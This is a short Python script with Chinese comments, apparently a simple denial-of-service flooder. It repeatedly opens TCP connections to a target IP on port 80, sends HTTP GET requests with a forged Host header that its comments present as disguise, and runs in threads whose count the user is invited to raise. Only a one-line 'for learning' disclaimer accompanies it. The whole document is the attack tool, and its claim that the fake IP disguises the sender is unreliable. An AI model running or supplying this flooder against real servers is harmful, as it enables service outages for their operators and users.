# 一切开发旨在学习，请勿用于非法用途

import socket
import threading

# 确认攻击目标
target = '127.0.0.1' # 攻击目标的 IP 地址
fake_ip = '223.30.81.143' # 随机生成的 IP 地址，用于伪装
port = 80 # 攻击目标的端口

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port)) # 连接至服务器
        # 发送空请求
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        # 断开连接
        s.close()

for i in range(1): # 将 1 替换为你需要的线程数量
    thread = threading.Thread(target=attack)
    thread.start()